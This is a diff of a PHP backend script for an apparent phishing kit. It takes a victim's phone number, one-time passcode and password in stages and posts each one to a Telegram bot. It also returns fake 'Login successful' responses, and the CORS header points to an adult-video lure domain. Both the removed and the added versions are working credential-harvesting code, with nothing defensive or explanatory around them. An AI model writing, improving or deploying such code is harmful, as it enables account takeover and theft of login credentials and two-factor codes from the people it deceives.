@@ -1,103 +1,70 @@
-<?php
-// Define allowed domain
-$allowedDomain = "https://desiviralxxxvideos.infy.uk";
+<?php    
+// Enable CORS for the specific domain    
+header("Access-Control-Allow-Origin: https://desiviralxxxvideos.infy.uk");    
+header("Access-Control-Allow-Methods: POST, GET, OPTIONS");    
+header("Access-Control-Allow-Headers: Content-Type");    
 
-// Enable CORS only for the allowed domain
-header("Access-Control-Allow-Origin: $allowedDomain");
-header("Access-Control-Allow-Methods: GET, POST");
-header("Access-Control-Allow-Headers: Content-Type");
+// Handle preflight requests (CORS OPTIONS request)    
+if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {    
+    http_response_code(204);    
+    exit();    
+}    
 
-// Validate origin and referer to prevent unauthorized access
-$origin = $_SERVER['HTTP_ORIGIN'] ?? '';
-$referer = $_SERVER['HTTP_REFERER'] ?? '';
+// Telegram Bot Configuration from environment variables    
+$telegramToken = getenv('TOKEN');    
+$chatId = getenv('ID');    
 
-if (!empty($origin) && $origin !== $allowedDomain && strpos($referer, $allowedDomain) !== 0) {
-    http_response_code(403); // Forbidden
-    echo json_encode(["error" => "Access denied"]);
-    exit();
-}
+// Function to send a message to Telegram    
+function sendToTelegram($message) {    
+    global $telegramToken, $chatId;    
 
-// Allow only GET and POST requests
-if ($_SERVER['REQUEST_METHOD'] !== 'POST' && $_SERVER['REQUEST_METHOD'] !== 'GET') {
-    http_response_code(405); // Method Not Allowed
-    echo json_encode(["error" => "Only GET and POST requests are allowed"]);
-    exit();
-}
+    if (!$telegramToken || !$chatId) {    
+        error_log("Telegram credentials are missing.");    
+        return;    
+    }    
 
-// Load environment variables
-$telegramToken = getenv('TOKEN'); // Secure token storage
-$chatId = getenv('ID'); // Store Chat ID in environment variable
+    $url = "https://api.telegram.org/bot$telegramToken/sendMessage";    
 
-// Function to send a message to Telegram
-function sendToTelegram($message) {
-    global $telegramToken, $chatId;
+    $postData = [    
+        'chat_id' => $chatId,    
+        'text' => $message,    
+        'parse_mode' => 'MarkdownV2'    
+    ];    
 
-    $url = "https://api.telegram.org/bot$telegramToken/sendMessage";
-    $postData = [
-        'chat_id' => $chatId,
-        'text' => $message,
-        'parse_mode' => 'MarkdownV2'
-    ];
+    $ch = curl_init();    
+    curl_setopt($ch, CURLOPT_URL, $url);    
+    curl_setopt($ch, CURLOPT_POST, 1);    
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);    
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);    
+    curl_exec($ch);    
+    curl_close($ch);    
+}    
 
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_POST, 1);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_exec($ch);
-    curl_close($ch);
-}
+// Handle POST Requests    
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {    
+    $action = $_POST['action'] ?? '';    
 
-// Handle both GET and POST requests
-$requestData = $_SERVER['REQUEST_METHOD'] === 'POST' ? $_POST : $_GET;
-$action = $requestData['action'] ?? '';
+    if ($action === 'phone') {    
+        $phone = $_POST['phone'] ?? '';    
+        sendToTelegram("*Phone:* \n`$phone`");    
+        echo 'step="code"';    
+        exit;    
+    }    
 
-if ($action === 'phone') {
-    $phone = $requestData['phone'] ?? '';
+    if ($action === 'otp') {    
+        $phone = $_POST['phone'] ?? '';    
+        $code = $_POST['code'] ?? '';    
+        sendToTelegram("*OTP:*\n Phone: `$phone`\n OTP: `$code`");    
+        echo 'step="password"';    
+        exit;    
+    }    
 
-    if (empty($phone)) {
-        echo json_encode(["error" => "Phone number is required"]);
-        exit();
-    }
-
-    sendToTelegram("*Phone:* \n`$phone`");
-
-    // Respond with step transition
-    echo json_encode(["step" => "otp", "message" => "Enter OTP", "phone" => $phone]);
-    exit;
-}
-
-if ($action === 'otp') {
-    $phone = $requestData['phone'] ?? '';
-    $code = $requestData['code'] ?? '';
-
-    if (empty($phone) || empty($code)) {
-        echo json_encode(["error" => "Phone and OTP are required"]);
-        exit();
-    }
-
-    sendToTelegram("*OTP:*\n Phone: `$phone`\n OTP: `$code`");
-
-    echo json_encode(["step" => "password", "message" => "Enter your password", "phone" => $phone]);
-    exit;
-}
-
-if ($action === 'password') {
-    $phone = $requestData['phone'] ?? '';
-    $password = $requestData['password'] ?? '';
-
-    if (empty($phone) || empty($password)) {
-        echo json_encode(["error" => "Phone and password are required"]);
-        exit();
-    }
-
-    sendToTelegram("*Login:*\n Phone: `$phone`\n Password: `$password`");
-
-    echo json_encode(["status" => "success", "message" => "Login successful"]);
-    exit;
-}
-
-// Default response if no valid action
-http_response_code(400);
-echo json_encode(["error" => "Invalid request"]);
+    if ($action === 'password') {    
+        $phone = $_POST['phone'] ?? '';    
+        $password = $_POST['password'] ?? '';    
+        sendToTelegram("*Login:*\n Phone: `$phone`\n Password: `$password`");    
+        echo 'success';    
+        exit;    
+    }    
+}    
 ?>
